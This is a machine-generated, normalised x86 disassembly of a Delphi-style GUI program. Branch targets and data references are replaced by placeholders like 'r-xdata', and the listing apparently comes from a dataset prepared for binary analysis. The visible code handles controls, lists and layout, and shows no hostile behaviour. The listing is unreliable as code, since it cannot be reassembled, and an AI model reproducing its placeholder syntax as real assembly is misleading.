lea eax [ ebx + 0x40 ]
call sub_40d4f0
mov edx edi
mov eax [ ebx + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x38 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_47eb34
test [ edi + 0x1c ] 0x1
jne r-xdata
mov eax ebx
mov si 0xfffc
call sub_4034a4
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x38 ] eax
mov cl 0x1
mov eax ebx
call sub_47eb58
call sub_47cb00
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
mov eax [ eax + 0xc ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
jmp r-xdata
mov edx edi
mov eax ebx
mov si 0xfffd
call sub_4034a4
mov eax [ ebx + 0x4 ]
call sub_47cb00
mov edx eax
mov eax edi
call sub_421018
mov eax ebx
call sub_47eb58
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x18 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
sub_47ef98
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax [ edi + 0x20 ]
mov edx esi
call sub_404444
je r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x20 ]
mov edx esi
call sub_40408c
mov eax edi
call sub_47eb64
test eax eax
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404444
je r-xdata
mov [ edi + 0x50 ] bl
test bl bl
je r-xdata
mov bl 0x1
mov eax esi
mov edx r-xdata
call sub_404444
je r-xdata
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_47ee8c
xor edx edx
mov eax edi
call sub_47f154
mov edx esi
call sub_44c8a4
sub_47f028
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
call sub_40d4f0
mov eax esi
mov [ ebx + 0x40 ] eax
test eax eax
je r-xdata
mov eax ebx
call sub_47eb64
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xfffd
call sub_4034a4
mov edx ebx
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_47f06c
push esi
push edi
mov esi eax
cmp edx [ esi + 0x58 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x58 ] edx
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esi + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_47f094
push esi
mov esi eax
mov eax esi
call sub_4194e0
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
call sub_47b62c
pop esi
retn
mov edx [ eax ]
call [ edx + 0xcc ]
sub_47f0c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp ebp [ ebx + 0x4c ]
ja r-xdata
mov eax ebx
call sub_4193b8
mov edi eax
inc edi
mov eax ebx
call sub_47eb58
call sub_419748
mov esi eax
dec esi
sub esi edi
jl r-xdata
mov eax ebx
call sub_4193b8
test eax eax
je r-xdata
mov [ ebx + 0x4c ] ebp
inc esi
mov eax ebx
call sub_4193b8
dec eax
push eax
mov eax ebx
call sub_47eb58
pop edx
call sub_47df90
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ ecx + 0x4c ]
cdq
xor eax edx
sub eax edx
add eax ebp
mov [ ecx + 0x4c ] eax
mov [ ecx + 0x4c ] ebp
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47eb58
mov edx edi
call sub_47df90
mov ecx eax
mov eax [ ecx + 0x4c ]
cmp eax [ ebx + 0x4c ]
jne r-xdata
inc edi
dec esi
jne r-xdata
sub_47f154
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47f1a9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp si [ ebx + 0x48 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f1b0
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov [ ebx + 0x48 ] si
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45c818
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x54 ]
call sub_40408c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
sub_47f1b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x51 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47eb58
call sub_47cb00
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ esi + 0x51 ] bl
mov eax esi
call sub_47ecd0
test al al
jne r-xdata
test bl bl
jne r-xdata
mov al 0x1
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
jmp r-xdata
mov eax edi
call sub_42156c
test eax eax
je r-xdata
mov [ esi + 0x51 ] al
jmp r-xdata
sub_47f210
push esi
push edi
mov esi eax
cmp dl [ esi + 0x52 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x52 ] dl
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esi + 0x40 ]
mov eax [ eax + 0x30 ]
call sub_44f978
sub_47f23c
push esi
mov esi eax
cmp edx 0x7fffffff
jne r-xdata
mov [ esi + 0x44 ] edx
xor eax eax
mov [ esi + 0x44 ] eax
jmp r-xdata
pop esi
retn
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ esi + 0x3c ] 0x1
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
sub_47f264
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x30 ]
jne r-xdata
mov [ esi + 0x30 ] bl
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
cmp bl [ eax + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl [ eax + 0x57 ]
je r-xdata
cmp bl [ edi + 0x57 ]
je r-xdata
mov dl [ esi + 0x30 ]
call sub_44c794
mov eax [ esi + 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ebx [ edi + 0x30 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
mov dl [ esi + 0x30 ]
mov eax edi
call sub_44c794
mov eax ebx
xor edx edx
call sub_44c794
jmp r-xdata
sub_47f2dc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov dl [ esp ]
mov eax ebx
call sub_47dad8
mov eax ebx
call sub_47d690
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edx
pop ebx
retn
mov eax ebx
call sub_47eb58
mov eax [ eax + 0x20 ]
mov al [ eax + 0x31 ]
cmp al [ ebx + 0x31 ]
jbe r-xdata
mov eax ebx
call sub_47d690
mov dl [ ebx + 0x31 ]
mov [ eax + 0x31 ] dl
sub_47f328
push esi
push edi
mov esi eax
cmp dl [ esi + 0x61 ]
je r-xdata
pop edi
pop esi
retn
mov [ esi + 0x61 ] dl
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_47f348
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4194b0
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x40 ]
call sub_40d4f0
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov si 0xffcf
call sub_4034a4
sub_47f37c
push ebx
push esi
push edi
push ebp
push ecx
mov esi eax
mov bl [ esi + 0x60 ]
cmp [ esi + 0x3c ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47eb58
cmp [ eax + 0x2a ] 0x0
jne r-xdata
mov eax esi
call sub_47eb58
call sub_47cb00
mov ebp eax
cmp [ esi + 0x50 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx esi
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax esi
call sub_4193b8
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
mov [ esi + 0x3c ] 0x0
mov eax esi
call sub_47d6b0
call sub_419748
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov eax esi
call sub_4193b8
test eax eax
jle r-xdata
mov eax esi
call sub_47d778
mov ebx eax
xor bl 0x1
mov [ esi + 0x60 ] bl
mov eax [ esi + 0x4 ]
call sub_419748
dec eax
test eax eax
jl r-xdata
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax esi
call sub_4193b8
dec eax
push eax
mov eax esi
call sub_47eb58
pop edx
call sub_47df90
cmp [ eax + 0x50 ] 0x0
jne r-xdata
inc eax
mov [ esp ] eax
mov eax esi
call sub_4193b8
dec eax
push eax
mov eax esi
call sub_47eb58
pop edx
call sub_47df90
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
dec [ esp ]
jne r-xdata
mov eax esi
call sub_4193b8
inc eax
push eax
mov eax esi
call sub_47eb58
pop edx
call sub_47df90
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov eax esi
call sub_4193b8
push eax
mov eax [ esi + 0x4 ]
call sub_419748
dec eax
pop edx
cmp edx eax
jge r-xdata
jmp r-xdata
mov eax esi
call sub_4193b8
inc eax
push eax
mov eax esi
call sub_47eb58
pop edx
call sub_47df90
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_47f4dc
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x38 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_47f4fc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403298
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47f52c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebx + 0x40 ]
call sub_4188d4
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x40 ]
call sub_4188d4
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
retn
sub_47f568
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_449c6c
mov eax [ ebx + 0x40 ]
mov esi [ eax + 0x40 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41725c
lea edx [ ebp - 0x14 ]
lea ecx [ ebp - 0xc ]
mov eax esi
call sub_44c3b8
cmp [ ebx + 0x1c ] 0x0
je r-xdata
xor eax eax
call sub_47b62c
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
lea edx [ ebp - 0x24 ]
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x24 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_4032a8
sub_47f5fc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx [ esi + 0x40 ]
mov eax ebx
call sub_44ca14
mov edx [ esi + 0x74 ]
mov eax ebx
call sub_44ca14
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4533bc
test al al
je r-xdata
sub_47f660
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418930
inc eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418778
mov edx esi
mov eax ebx
call sub_421018
mov edx ebx
mov eax esi
call sub_47f5fc
mov edx ebx
mov eax esi
call sub_47f644
sub_47f6a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420f48
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi + 0x30 ] eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47f6ec
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47f750
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421264
dec bl
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edx edi
mov eax [ esi + 0x30 ]
call sub_418930
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ esi + 0x30 ]
call sub_4187c4
sub_47f798
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418930
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebx + 0x30 ]
call sub_4187c4
mov edx esi
mov eax ebx
call sub_421248
sub_47f7c8
push ebx
mov ebx eax
cmp edx [ ebx + 0x40 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x40 ] edx
mov eax sub_47f5fc
mov ecx edx
mov edx ebx
xchg edx eax
call sub_47f88c
cmp [ ebx + 0x60 ] 0x20000000
jne r-xdata
cmp [ ebx + 0x48 ] 0x20000000
jne r-xdata
mov edx 0x13
mov eax [ ebx + 0x40 ]
call sub_46ebb4
mov [ ebx + 0x60 ] eax
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov edx 0xffffffce
mov eax [ ebx + 0x40 ]
call sub_46ec74
mov [ ebx + 0x48 ] eax
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_47f830
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x50 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x50 ] esi
cmp [ ebx + 0x48 ] 0x20000000
jne r-xdata
cmp [ ebx + 0x4c ] 0x20000000
jne r-xdata
mov edx 0xffffffce
mov eax [ ebx + 0x40 ]
call sub_46ec74
mov [ ebx + 0x48 ] eax
mov edx sub_47f644
mov ecx esi
mov eax ebx
call sub_47f88c
mov edx 0x13
mov eax [ ebx + 0x40 ]
call sub_46ebb4
mov [ ebx + 0x4c ] eax
sub_47f88c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4188d4
mov edx ebx
call ebp
inc edi
dec esi
jne r-xdata
sub_47f8bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov eax [ edi + 0x34 ]
mov [ ebx + 0x34 ] eax
mov eax [ edi + 0x38 ]
mov [ ebx + 0x38 ] eax
mov eax [ edi + 0x3c ]
mov [ ebx + 0x3c ] eax
mov edx [ edi + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov eax [ edi + 0x70 ]
mov [ ebx + 0x70 ] eax
mov eax edi
call sub_47f71c
mov [ ebx + 0x44 ] eax
mov eax [ edi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax [ edi + 0x4c ]
mov [ ebx + 0x4c ] eax
mov edx [ edi + 0x50 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ edi + 0x78 ]
mov [ ebx + 0x78 ] eax
mov eax [ edi + 0x7c ]
mov [ ebx + 0x7c ] eax
mov eax [ edi + 0x80 ]
mov [ ebx + 0x80 ] eax
mov eax [ edi + 0x84 ]
mov [ ebx + 0x84 ] eax
mov eax [ edi + 0x6c ]
mov [ ebx + 0x6c ] eax
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov eax [ edi + 0x5c ]
mov [ ebx + 0x5c ] eax
mov eax [ edi + 0x74 ]
mov [ ebx + 0x74 ] eax
mov eax [ edi + 0x68 ]
mov [ ebx + 0x68 ] eax
mov eax [ edi + 0x64 ]
mov [ ebx + 0x64 ] eax
mov eax [ edi + 0x58 ]
mov [ ebx + 0x58 ] eax
mov eax edi
call sub_47f734
mov [ ebx + 0x60 ] eax
mov eax [ edi + 0x88 ]
mov [ ebx + 0x88 ] eax
mov eax [ edi + 0x8c ]
mov [ ebx + 0x8c ] eax
sub_47f990
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42f1b0
mov [ ebx + 0x224 ] 0x1
mov eax ebx
call sub_481dd0
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x12c ]
xor eax eax
mov [ ebx + 0x214 ] eax
xor eax eax
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov esi eax
mov [ ebx + 0x21c ] esi
mov eax esi
mov edx ebx
call sub_44b428
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x32
mov eax ebx
call sub_44c02c
mov edx 0x96
mov eax ebx
call sub_44c008
mov [ ebx + 0x1f8 ] 0x1
mov [ ebx + 0x254 ] 0x1
xor eax eax
mov [ ebx + 0x258 ] eax
mov [ ebx + 0x218 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_47fa60
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_481450
mov eax [ esi + 0x21c ]
call sub_4032a8
lea eax [ esi + 0x274 ]
call sub_40d4f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ef08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_47fad4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_480f04
test al al
je r-xdata
cmp [ esi + 0x16c ] 0x0
je r-xdata
xor edi edi
mov eax ebx
call sub_480ed8
call sub_419748
mov edi eax
jmp r-xdata
mov eax [ esi + 0x16c ]
call sub_4193b8
mov edi eax
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x40 ]
jge r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x44 ]
jge r-xdata
mov al [ ebx + 0x227 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_44c214
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov al [ ebx + 0x227 ]
sub al 0x2
jne r-xdata
dec edi
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_44c214
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov al [ ebx + 0x227 ]
test al al
jne r-xdata
dec edi
mov eax ebx
call sub_480ed8
call sub_419748
cmp edi eax
jle r-xdata
mov al [ ebx + 0x227 ]
sub al 0x2
jne r-xdata
inc edi
test edi edi
jge r-xdata
mov eax ebx
call sub_480ed8
call sub_419748
mov edi eax
inc edi
xor edi edi
jmp r-xdata
sub_47fbb4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_47fc38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x114 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_47d5b0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x210 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x108 ]
call sub_4032a8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47fc44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4525a4
mov edx esi
mov eax ebx
call sub_44fe08
pop esi
pop ebx
retn
sub_47fc60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x40 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034a4
mov ebx eax
test ebx ebx
je r-xdata
call sub_4032a8
xor edx edx
mov eax edi
call sub_47f028
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_47fd4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov dl 0x6
mov eax [ ebp - 0x8 ]
call sub_44bd60
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x168 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0x8 ]
call sub_47f028
mov eax [ ebp - 0x8 ]
mov si 0xffd0
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
sub_47fd60
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44f950
xor eax eax
push ebp
push sub_47fe68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_47d6b0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_47d63c
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_419748
mov edi eax
dec edi
test edi edi
jl r-xdata
call sub_403b20
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_419748
not eax
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_47d750
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_47df90
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd4 ]
mov esi eax
test esi esi
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax esi
call sub_4837b8
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov dl 0x1
sub_47fe78
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebp eax
mov eax esi
mov ebx [ r-xdata ]
mov edx ebx
call sub_403434
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov edx ebx
call sub_403434
test al al
jne r-xdata
mov ebx eax
test bl bl
je r-xdata
mov al 0x1
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esi + 0x16c ]
test ebx ebx
je r-xdata
xor ebx ebx
cmp [ edi + 0x16c ] 0x0
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax [ ebp + 0x268 ]
jle r-xdata
mov eax ebx
call sub_4193b8
push eax
mov eax [ edi + 0x16c ]
call sub_4193b8
pop edx
cmp edx eax
setl al
mov ebx eax
jmp r-xdata
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
cmp eax [ ebp + 0x26c ]
jle r-xdata
mov eax [ esi + 0x4c ]
mov [ ebp + 0x268 ] eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ edi + 0x57 ] 0x0
je r-xdata
mov eax [ edi + 0x4c ]
cmp eax [ ebp + 0x268 ]
jle r-xdata
mov eax [ esi + 0x48 ]
mov [ ebp + 0x26c ] eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ edi + 0x48 ]
cmp eax [ ebp + 0x26c ]
jle r-xdata
mov eax [ edi + 0x4c ]
mov [ ebp + 0x268 ] eax
mov al [ ebp + 0x227 ]
sub al 0x2
jb r-xdata
mov eax [ edi + 0x48 ]
mov [ ebp + 0x26c ] eax
mov dl 0x2
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov ecx eax
mov eax [ ebp + 0x258 ]
add eax eax
add eax [ ebp + 0x26c ]
add ecx eax
mov edx 0x3
mov eax [ ebp + 0x74 ]
call sub_44b4f0
sub al 0x2
jae r-xdata
mov ecx [ ebp + 0x254 ]
add ecx ecx
add ecx [ ebp + 0x268 ]
mov edx 0x2
mov eax [ ebp + 0x74 ]
call sub_44b4f0
jmp r-xdata
sub_47ffb4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
